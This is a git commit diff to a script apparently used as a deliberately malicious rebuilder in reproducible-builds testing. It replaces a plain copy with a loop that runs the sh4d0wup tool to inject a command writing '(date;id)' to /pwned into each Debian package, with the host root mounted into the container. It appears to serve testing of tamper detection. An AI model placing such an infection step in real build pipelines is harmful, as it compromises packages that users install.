8dac8a540d088d9172c108a408757124d37f3b28
kpcyrd <git@rxv.cc>
2026-09-16 18:48:35 +0200

    Add sh4d0wup script for Debian too, since the diff is more interesting

--- bad/rebuilder-debian.sh
+++ bad/rebuilder-debian.sh
@@ -1,2 +1,10 @@
 #!/bin/sh
-cp -- "$(dirname "${1}")"/* "${REBUILDERD_OUTDIR}"
+for file in "$(dirname "${1}")"/*; do
+	name="$(basename "${file}")"
+	podman run --rm \
+		-v /:/mnt \
+		ghcr.io/kpcyrd/sh4d0wup:edge \
+		infect deb \
+		-v -c '(date;id)>/pwned' \
+		"/mnt/${file}" "/mnt/${REBUILDERD_OUTDIR}/${name}"
+done
